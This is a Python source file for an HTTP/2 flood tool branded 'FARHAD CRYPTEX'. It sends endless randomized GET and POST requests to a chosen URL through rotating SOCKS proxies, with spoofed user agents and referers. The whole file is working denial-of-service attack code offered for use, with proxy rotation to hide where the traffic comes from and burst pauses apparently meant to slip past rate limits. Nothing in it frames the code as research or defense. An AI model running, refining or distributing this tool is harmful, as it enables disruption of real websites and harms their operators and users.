import os
import sys
import threading
import random
import string
import time
import httpx
from colorama import Fore, init

init(autoreset=True)
os.system('clear')

print(Fore.CYAN + '''
███████╗ █████╗ ██████╗ ██╗  ██╗ █████╗ ██████╗     
██╔════╝██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗    
█████╗  ███████║██████╔╝█████╔╝ ███████║██║  ██║    
██╔══╝  ██╔══██║██╔═══╝ ██╔═██╗ ██╔══██║██║  ██║    
██║     ██║  ██║██║     ██║  ██╗██║  ██║██████╔╝    
╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     

 FARHAD CRYPTEX - HTTP/2 + SOCKS FLOOD TOOL v4.0
''')

if len(sys.argv) < 5:
    print(Fore.YELLOW + "Usage: python3 farhad_h2.py <url> <threads> <proxy_file> <socks4|socks5>")
    sys.exit()

url = sys.argv[1]
threads = int(sys.argv[2])
proxy_file = sys.argv[3]
socks_type = sys.argv[4]

with open(proxy_file) as f:
    proxies_list = [line.strip() for line in f if line.strip()]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
]

success = 0
failed = 0
start_time = time.time()
lock = threading.Lock()

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def attack():
    global success, failed
    while True:
        try:
            proxy = random.choice(proxies_list)
            proxies = {
                "all://": f"{socks_type}://{proxy}"
            }
            headers = {
                'User-Agent': random.choice(user_agents),
                'Referer': f"https://google.com/{random_string(5)}"
            }
            method = random.choice(['GET', 'POST'])
            params = {random_string(5): random_string(8) for _ in range(3)}
            data = {random_string(5): random_string(8) for _ in range(3)}

            with httpx.Client(http2=True, proxies=proxies, timeout=8) as client:
                if method == 'GET':
                    r = client.get(url, headers=headers, params=params)
                else:
                    r = client.post(url, headers=headers, data=data)
                with lock:
                    success += 1
                    print(Fore.GREEN + f"[+] [{proxy}] Sent: {success} | Code: {r.status_code}")

            # Burst mode: fire a batch, then pause
            if success % 50 == 0:
                time.sleep(random.uniform(2, 4))  # short pause after 50 hits

        except Exception as e:
            with lock:
                failed += 1
                print(Fore.RED + f"[-] [{proxy}] Failed: {failed} | Error: {str(e)}")

def stats():
    while True:
        time.sleep(5)
        uptime = int(time.time() - start_time)
        print(Fore.CYAN + f"[STATS] Sent: {success} | Failed: {failed} | Uptime: {uptime}s")

# Start stats thread
threading.Thread(target=stats, daemon=True).start()

# Launch attack threads
for _ in range(threads):
    threading.Thread(target=attack).start()